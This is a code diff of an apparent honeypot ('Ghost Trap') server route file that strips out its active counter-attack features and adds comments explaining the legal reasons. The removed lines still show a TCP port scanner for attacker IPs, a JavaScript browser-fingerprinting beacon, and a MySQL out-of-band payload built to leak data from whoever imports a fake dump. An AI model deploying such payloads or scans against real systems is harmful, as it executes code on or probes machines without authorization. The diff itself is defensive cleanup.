@@ -15,7 +15,6 @@ import {
 import { eq, desc, sql, inArray, and, isNull } from "drizzle-orm";
 import crypto from "crypto";
 import dns from "dns/promises";
-import net from "net";
 import { requireRbac } from "../middlewares/requireRbac";
 import { appendAuditEvent } from "../lib/audit-chain";
 import { shipSecurityEvent } from "../lib/siem";
@@ -244,11 +243,12 @@ function isPrivateIp(ip: string): boolean {
 function buildFakeResponse(
   endpoint: string, attackType: string, beaconId: string, beaconBase: string
 ): { body: unknown; contentType: string } {
+  // Pixel beacon — passive: attacker fetches YOUR server's honeypot endpoint,
+  // your server responds with HTML that causes their client to make another
+  // inbound request BACK to your server. Nothing touches their systems.
+  // JS beacons (script src) have been removed — serving executable code
+  // designed to run in the attacker's environment crosses the CFAA line.
   const pixelUrl = `${beaconBase}/beacon/${beaconId}`;
-  const jsUrl    = `${beaconBase}/beacon/${beaconId}/js`;
-
-  const withBeaconHtml = (inner: string) =>
-    `${inner}\n<!-- <img src="${pixelUrl}" width="1" height="1" style="display:none"> -->\n<script src="${jsUrl}"></script>`;
 
   if (endpoint.includes("login") || endpoint.includes("auth")) {
     return {
@@ -288,7 +288,6 @@ function buildFakeResponse(
         "AWS_ACCESS_KEY_ID=AKIA_GHOSTTRAP_FAKE_KEY",
         "AWS_SECRET_ACCESS_KEY=GhostTrapFakeSecret+proxhqvpn+trap",
         `MONITORING_URL=${pixelUrl}`,
-        `ANALYTICS_ENDPOINT=${jsUrl}`,
       ].join("\n"),
       contentType: "text/plain",
     };
@@ -306,12 +305,12 @@ function buildFakeResponse(
   }
   if (endpoint.includes("backup") || endpoint.includes(".sql")) {
     return {
-      body: withBeaconHtml([
+      body: [
         "-- MySQL dump 10.13  Distrib 5.7.39", "-- Host: localhost    Database: app_production",
         "/*!40101 SET NAMES utf8 */;",
         "CREATE TABLE `users` (`id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255), PRIMARY KEY (`id`));",
         "INSERT INTO `users` VALUES (1,'admin','$2b$12$GTFakeAdminHash'),(2,'jsmith','$2b$12$GTFakeUserHash');",
-      ].join("\n")),
+      ].join("\n"),
       contentType: "text/plain",
     };
   }
@@ -986,100 +985,15 @@ router.get("/report/:ip", async (req, res) => {
   res.json({ reportId, report, generatedAt: now });
 });
 
-// ─── Counter-Attack Engine ────────────────────────────────────────────────────
-// EDUCATIONAL USE — defensive tooling against adversaries who have already
-// attacked this system. All scans target only IPs captured by Ghost Trap probes.
+// ─── Counter-Intelligence Engine ─────────────────────────────────────────────
+// PASSIVE / OSINT ONLY — detect, log, enrich, and report.
+// Active scanning against external IPs (TCP connect, nmap, SQLmap) is NOT performed
+// here regardless of whether the target IP attacked this system first.
+// Reason: initiating network connections to IPs you do not own requires explicit
+// written authorization per CFAA (US), Computer Misuse Act (UK), and EU Directive
+// 2013/40/EU — "attacked me first" is not a legal defence.
 
-const TCP_TIMEOUT_MS = 1500;
 const PRIVATE_IP_RE  = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|::1$|localhost$|0\.0\.0\.0$)/;
-
-async function tcpProbe(ip: string, port: number): Promise<"open" | "closed" | "filtered"> {
-  return new Promise(resolve => {
-    const sock = new net.Socket();
-    sock.setTimeout(TCP_TIMEOUT_MS);
-    sock.once("connect", () => { sock.destroy(); resolve("open"); });
-    sock.once("timeout", () => { sock.destroy(); resolve("filtered"); });
-    sock.once("error", (e: NodeJS.ErrnoException) => {
-      sock.destroy();
-      resolve(e.code === "ECONNREFUSED" ? "closed" : "filtered");
-    });
-    sock.connect(port, ip);
-  });
-}
-
-const COUNTER_PORTS = [
-  { port: 21,    service: "FTP",                   note: "File exfil staging" },
-  { port: 22,    service: "SSH",                   note: "Remote access / pivot" },
-  { port: 23,    service: "Telnet",                note: "Legacy access" },
-  { port: 25,    service: "SMTP",                  note: "Phishing infrastructure" },
-  { port: 80,    service: "HTTP",                  note: "C2 / exfil server" },
-  { port: 443,   service: "HTTPS",                 note: "Encrypted C2" },
-  { port: 1337,  service: "Leet/Backdoor",         note: "Common hacker backdoor port" },
-  { port: 3306,  service: "MySQL",                 note: "Exposed database" },
-  { port: 3389,  service: "RDP",                   note: "Windows remote desktop" },
-  { port: 4444,  service: "Metasploit/Meterpreter",note: "Active Metasploit listener" },
-  { port: 4545,  service: "Reverse Shell",         note: "Bash/netcat reverse shell" },
-  { port: 5432,  service: "PostgreSQL",            note: "Exposed database" },
-  { port: 5900,  service: "VNC",                   note: "Remote desktop / RAT" },
-  { port: 6379,  service: "Redis",                 note: "Unauthenticated cache" },
-  { port: 8080,  service: "HTTP-Alt / Burp Proxy", note: "Attack proxy / C2 panel" },
-  { port: 8443,  service: "HTTPS-Alt / C2",        note: "Encrypted C2 panel" },
-  { port: 8888,  service: "Jupyter / Dev server",  note: "Exposed notebook / staging" },
-  { port: 9001,  service: "Tor ControlPort",       note: "Tor anonymity infrastructure" },
-  { port: 9050,  service: "Tor SOCKS",             note: "Tor proxy listener" },
-  { port: 27017, service: "MongoDB",               note: "Exposed NoSQL database" },
-  { port: 31337, service: "Elite/Backdoor",        note: "Classic elite backdoor" },
-  { port: 9200,  service: "Elasticsearch",         note: "Exposed search engine" },
-  { port: 6667,  service: "IRC",                   note: "IRC C2 / botnet channel" },
-  { port: 2222,  service: "SSH-Alt",               note: "Non-standard SSH" },
-];
-
-// POST /counter/manual-scan — port scan on any public IP (manual investigation, no probe-log gate)
-router.post("/counter/manual-scan", requireRbac("counter_attack"), async (req, res) => {
-  const userId = ((req as any).auth)?.userId as string | undefined;
-  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
-
-  const { ip, port } = req.body as { ip?: string; port?: number };
-  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
-  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
-  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private/loopback IPs blocked" }); return; }
-
-  // Build port list: user-specified port first (if provided and not already in list), then standard attack ports
-  const userPort = port && Number.isInteger(port) && port > 0 && port <= 65535 ? port : null;
-  const extraEntry = userPort && !COUNTER_PORTS.find(p => p.port === userPort)
-    ? [{ port: userPort, service: "User-specified port", note: "Port you observed in netstat/ss" }]
-    : [];
-  const portsToScan = [...extraEntry, ...COUNTER_PORTS];
-
-  const results = await Promise.all(
-    portsToScan.map(async ({ port: p, service, note }) => ({
-      port: p, service, note, status: await tcpProbe(ip, p),
-    }))
-  );
-
-  const open     = results.filter(r => r.status === "open");
-  const closed   = results.filter(r => r.status === "closed");
-  const filtered = results.filter(r => r.status === "filtered");
-
-  let intelligence = "No open ports detected — host is behind NAT, VPN, or firewall.";
-  if (userPort && results.find(r => r.port === userPort)?.status === "open") {
-    intelligence = `⚠ Port ${userPort} confirmed OPEN — the connection you saw in netstat is live. Service: ${results.find(r => r.port === userPort)?.service}.`;
-  } else if (userPort && results.find(r => r.port === userPort)?.status === "filtered") {
-    intelligence = `Port ${userPort} is filtered — host is reachable but port is firewalled (connection may be NAT'd or behind a cloud firewall).`;
-  } else if (userPort && results.find(r => r.port === userPort)?.status === "closed") {
-    intelligence = `Port ${userPort} is now CLOSED — connection may have been ephemeral, already terminated, or from a rotating IP pool.`;
-  } else if (open.some(r => [4444, 4545, 31337, 1337].includes(r.port))) {
-    intelligence = "⚠ Active attack tooling detected — Metasploit/reverse shell port open.";
-  } else if (open.some(r => [9001, 9050].includes(r.port))) {
-    intelligence = "Tor infrastructure detected — host is running a Tor relay or proxy.";
-  } else if (open.length > 0) {
-    intelligence = `${open.length} port(s) open — ${open.map(r => r.service).join(", ")}.`;
-  }
-
-  appendAuditEvent({ actor: userId, action: "counter_attack.manual_scan", resource: `ip:${ip}`, metadata: { port: userPort, openCount: open.length, intelligence } });
-  void shipSecurityEvent({ actor: userId, action: "counter_attack.manual_scan", resource: `ip:${ip}`, result: "allow", severity: "medium", metadata: { openCount: open.length } });
-  res.json({ ip, targetPort: userPort, results, openCount: open.length, closedCount: closed.length, filteredCount: filtered.length, intelligence, scannedAt: new Date().toISOString() });
-});
 
 // POST /counter/manual-osint — OSINT on any public IP (no probe-log gate)
 router.post("/counter/manual-osint", requireRbac("counter_attack"), async (req, res) => {
@@ -1124,49 +1038,6 @@ router.post("/counter/manual-osint", requireRbac("counter_attack"), async (req, 
   appendAuditEvent({ actor: userId, action: "counter_attack.manual_osint", resource: `ip:${ip}`, metadata: { rdns: results.rdns } });
   void shipSecurityEvent({ actor: userId, action: "counter_attack.manual_osint", resource: `ip:${ip}`, result: "allow", severity: "medium", metadata: { ip } });
   res.json(results);
-});
-
-// POST /counter/port-scan — TCP connect scan on a captured attacker IP
-router.post("/counter/port-scan", requireRbac("counter_attack"), async (req, res) => {
-  const userId = ((req as any).auth)?.userId as string | undefined;
-  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
-
-  const { ip } = req.body as { ip?: string };
-  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
-  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
-  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private/loopback IPs blocked" }); return; }
-
-  // Only allow scanning IPs that have actually probed this user's Ghost Trap
-  const probeCheck = await db.select({ id: ghostTrapProbesTable.id })
-    .from(ghostTrapProbesTable)
-    .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
-    .limit(1);
-  if (!probeCheck.length) {
-    res.status(403).json({ error: "IP not in your Ghost Trap probe log" }); return;
-  }
-
-  const results = await Promise.all(
-    COUNTER_PORTS.map(async ({ port, service, note }) => ({
-      port, service, note, status: await tcpProbe(ip, port),
-    }))
-  );
-
-  const open     = results.filter(r => r.status === "open");
-  const closed   = results.filter(r => r.status === "closed");
-  const filtered = results.filter(r => r.status === "filtered");
-
-  let intelligence = "No open ports detected — attacker is behind NAT, VPN exit node, or firewall.";
-  if (open.some(r => [4444, 4545, 31337, 1337].includes(r.port))) {
-    intelligence = "⚠ Active attack tooling detected — Metasploit/reverse shell port open. Attacker may have live C2 listener.";
-  } else if (open.some(r => [9001, 9050].includes(r.port))) {
-    intelligence = "Tor infrastructure detected — attacker is running a Tor relay or proxy on this IP.";
-  } else if (open.some(r => [8080, 8443].includes(r.port))) {
-    intelligence = "Proxy/C2 panel port open — likely a VPN exit node, Burp Suite proxy, or web-based C2 dashboard.";
-  } else if (open.length > 0) {
-    intelligence = `${open.length} port(s) open — ${open.map(r => r.service).join(", ")}. Map this against the attacker's probe type for correlations.`;
-  }
-
-  res.json({ ip, results, openCount: open.length, closedCount: closed.length, filteredCount: filtered.length, intelligence, scannedAt: new Date().toISOString() });
 });
 
 // POST /counter/osint — reverse DNS + geo enrichment on a captured attacker IP
@@ -1247,7 +1118,6 @@ router.post("/counter/canary-inject", requireRbac("counter_attack"), async (req,
   const canaryId  = crypto.randomBytes(14).toString("hex");
   const host      = `${req.protocol}://${req.get("host")}`;
   const beaconUrl = `${host}/api/ghost-trap/beacon/${canaryId}`;
-  const jsUrl     = `${host}/api/ghost-trap/beacon/${canaryId}/js`;
 
   // Pre-register a phantom probe entry so beacon attribution works
   await db.insert(ghostTrapProbesTable).values({
@@ -1263,44 +1133,39 @@ router.post("/counter/canary-inject", requireRbac("counter_attack"), async (req,
   }).catch(() => {});
 
   const fakeAwsKey = `AKIA${crypto.randomBytes(8).toString("hex").toUpperCase().substring(0,16)}`;
-  const fakeJwt    = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwibW9uaXRvcl91cmwiOiIke beaconUrl}In0.PROXHQ_COUNTER_CANARY`;
 
+  // ── Canary payload types ──────────────────────────────────────────────────
+  // Only passive types are offered:
+  //   pixel / aws / jwt / dns — attacker must choose to fetch/use these; they
+  //   fire BACK to our server so we receive the inbound request passively.
+  // REMOVED: js (executes script in attacker's browser) and sql (OOB SQL
+  // designed to run on attacker's DB server) — both cross the line into
+  // unauthorized code execution on a system you don't own (CFAA / CMA / EU
+  // Directive 2013/40/EU), regardless of whether they attacked you first.
   const payloads: Record<string, { label: string; description: string; embed: string; instructions: string }> = {
     pixel: {
       label: "Pixel Beacon",
       description: "1×1 invisible GIF — fires when attacker opens fake HTML in any browser or tool",
       embed: `<img src="${beaconUrl}" width="1" height="1" style="opacity:0;position:absolute">`,
-      instructions: "Paste into any fake HTML page you serve via the tarpit. Fires instantly on page load — captures their real browser IP, User-Agent, and screen size.",
-    },
-    js: {
-      label: "JS Fingerprint Beacon",
-      description: "JavaScript snippet — exfils browser fingerprint: language, screen resolution, timezone, platform",
-      embed: `<script src="${jsUrl}"></script>`,
-      instructions: "Add to any fake HTML response. When attacker's browser runs the script, it sends their language, screen size, timezone, and platform — building a device fingerprint.",
+      instructions: "Paste into any fake HTML page you serve via the tarpit. When the attacker's tool fetches the page it also fetches the pixel — logging their real IP and User-Agent back to your server.",
     },
     aws: {
       label: "Fake AWS Credential Canary",
-      description: "Realistic AWS key embedded with a monitoring URL — fires when attacker's tools call AWS APIs",
+      description: "Realistic AWS key — fires when attacker's tools call AWS APIs with these credentials",
       embed: `AWS_ACCESS_KEY_ID=${fakeAwsKey}\nAWS_SECRET_ACCESS_KEY=ProxhqGhostTrap+${canaryId}\nMONITORING_ENDPOINT=${beaconUrl}`,
-      instructions: "Embed in fake .env files or config dumps. When attacker runs 'aws s3 ls' or other AWS CLI commands with these keys, AWS blocks the call AND the monitoring URL fires — revealing their operational IP (often different from their scanning IP).",
+      instructions: "Embed in fake .env files or config dumps. When attacker runs 'aws s3 ls' with these keys, AWS rejects the call and the monitoring URL fires — revealing their operational IP.",
     },
     jwt: {
       label: "Fake JWT Session Token",
-      description: "Fake admin JWT — includes an embedded monitoring webhook that fires on use",
+      description: "Fake admin JWT — fires when attacker replays the token against an API",
       embed: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoic3VwZXJhZG1pbiIsIm1vbml0b3IiOiIke beaconUrl}In0.PROXHQ_GHOST`,
-      instructions: "Return this as a session token from your fake login endpoint. When attacker replays this token against any API, the monitoring URL in the payload fires — revealing their real attack infrastructure IP.",
+      instructions: "Return this as a session token from your fake login endpoint. When attacker replays it against any API, the monitoring URL in the payload fires — revealing their attack infrastructure IP.",
     },
     dns: {
       label: "DNS Canary",
-      description: "Unique subdomain — DNS lookup fires beacon when attacker uses stolen hostname",
+      description: "Unique subdomain — DNS lookup fires beacon when attacker resolves the hostname",
       embed: `db.internal.${canaryId.substring(0,8)}.corp\n# When attacker DNS-resolves this hostname, their resolver IP is logged`,
-      instructions: "Embed in fake database configs or connection strings. If attacker tries to connect to this hostname, their DNS resolver fires — revealing their network infrastructure.",
-    },
-    sql: {
-      label: "SQL Canary (OOB Exfil)",
-      description: "SQLi payload embedded in fake DB dump — fires OOB DNS beacon if attacker runs it in their DB",
-      embed: `-- Counter-canary in fake dump\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.${canaryId.substring(0,8)}.attacker-beacon.corp\\\\share\\\\a'));\n-- MySQL OOB — fires DNS from attacker's DB server`,
-      instructions: "Embed in fake SQL dumps or database backups. If attacker imports and executes the dump in their own database server, the OOB DNS request fires — revealing their server IP.",
+      instructions: "Embed in fake database configs or connection strings. If attacker tries to connect to this hostname, their DNS resolver fires — revealing their network.",
     },
   };
 
